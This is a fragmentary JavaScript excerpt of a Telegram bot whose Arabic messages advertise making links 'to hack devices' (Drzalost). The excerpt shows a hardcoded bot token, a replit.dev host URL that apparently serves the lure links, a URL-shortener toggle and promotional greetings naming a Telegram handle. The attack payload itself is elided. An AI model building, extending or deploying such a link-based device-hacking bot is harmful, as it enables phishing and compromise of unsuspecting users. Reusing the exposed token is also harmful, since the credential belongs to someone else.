...
const bot = new TelegramBot(process.env["6813577320:AAGuzA_Jm2N_oACvxaCd3Mvw_GGje_ve0d8"], {polling: true});
...
var hostURL="https://a0051ec5-3b92-4dbc-b4d9-40eec1210d83-00-470oha68dlvv.worf.replit.dev/";
//TOGGLE for Shorters
var use1pt=false;
...
bot.sendMessage(chatId, `مرحبا${msg.chat.first_name} ! , \n يمكنك صنع رابط لإختراق الأجهزه من خلال البوت الخاص بنا \n  \n\nتابعني لتحصل علي التحديثات.\n@YA55EN0 \n\n `,m);
}
...
\n\nJoin the Telegram channel to follow the updates.
@YA55EN0
⚡how Use Bot :
...
bot.sendMessage(cid, `اهلا بكم في بوت Drzalost للأختراق برابط
